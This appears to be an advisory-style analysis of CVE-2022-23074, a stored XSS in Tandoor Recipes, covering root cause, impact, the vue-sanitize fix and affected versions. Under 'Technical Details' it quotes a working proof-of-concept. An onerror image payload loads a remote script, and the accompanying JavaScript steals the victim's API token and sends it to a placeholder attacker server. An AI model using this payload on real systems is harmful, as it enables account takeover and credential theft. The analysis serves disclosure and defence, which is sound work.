Based on the provided content, here's an analysis of CVE-2022-23074:

**Root Cause of Vulnerability:**
- The vulnerability stems from a lack of proper sanitization of user-supplied input in the `Name` field of Keyword, Food, and Unit components within the Recipes application. This allows an attacker to inject malicious code.

**Weaknesses/Vulnerabilities Present:**
- **Stored Cross-Site Scripting (XSS):** The primary vulnerability is Stored XSS. Malicious scripts are saved in the application's database, and later executed in the victim's browser when the data is displayed.
- **Improper Neutralization of Input:** The application fails to neutralize or encode the user-provided input, allowing execution of arbitrary JavaScript code.

**Impact of Exploitation:**
- **API Key Theft:** A low-privileged attacker can inject malicious JavaScript that steals the victim's API key.
- **Admin Account Takeover:** With the stolen API key, the attacker can potentially take over the administrator's account, leading to full control of the application and data.

**Attack Vectors:**
- The attacker injects the XSS payload into the `Name` field of a Keyword, Food, or Unit component through the application's interface.
- The XSS payload is triggered when a victim, such as an administrator, accesses the affected component's endpoint (e.g., the food list page).

**Required Attacker Capabilities/Position:**
- **Low Privileged Access:** The attacker needs a low-privileged account to inject malicious input.
- **Network Access:** The attacker must be able to access the application through the network.
- **Ability to Host a JavaScript File:** The attacker needs to host a malicious javascript file on a server they control, to which the victim will be directed to.

**Technical Details:**
- The vulnerable code is located within the frontend Vue.js application of Tandoor Recipes.
- The fix involves using the `vue-sanitize` library to sanitize data before rendering it to the user. The code changes include adding `Vue.use(VueSanitize);` to main files and changing `v-html="export_info.msg"` to `v-html="$sanitize(export_info.msg)"` in the template files to properly sanitize HTML tags
- The provided Proof of Concept (PoC) includes:
    - An XSS payload `<img src=a onerror="var x=document.createElement('script');x.src='<attacker_server>/api.js';document.body.appendChild(x);">`
    - JavaScript code for `api.js` to steal the API key, which is sent to attacker's server `var req = new XMLHttpRequest();req.onload = handleResponse;req.open('get','/settings/',true);req.send();function handleResponse() {t var a=this.responseText.match(/Authorization: Token.{1,}/)[0];t a=a.split("Token ")[1];t a=a.split("<")[0];t console.log(a);t var changeReq = new XMLHttpRequest();     changeReq.open('get', '<attacker_server>:<attacker_port>/api='+a, false);     changeReq.send()}`

**Affected Environments:**
- Recipes versions 0.17.0 through 1.2.5

**Resolution:**
- Update to version 1.2.6 or higher, which includes the fix for the XSS vulnerability.

**Additional Information:**
- The provided content from `github.com` shows the specific commit `7b2117c0190d4f541ba4cc7ee4122f04738c4ac6` where the sanitization fix was implemented.
- The vulnerability is categorized as CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting').
- CVSS v3.1 score: 5.4 (Network, Low Complexity, Low Privileges Required, User Interaction Required, Scope Changed, Confidentiality Low, Integrity Low, Availability None).
- CVSS v2 score: 3.5 (Network, Medium Complexity, Single Authentication, Confidentiality None, Integrity Partial, Availability None).
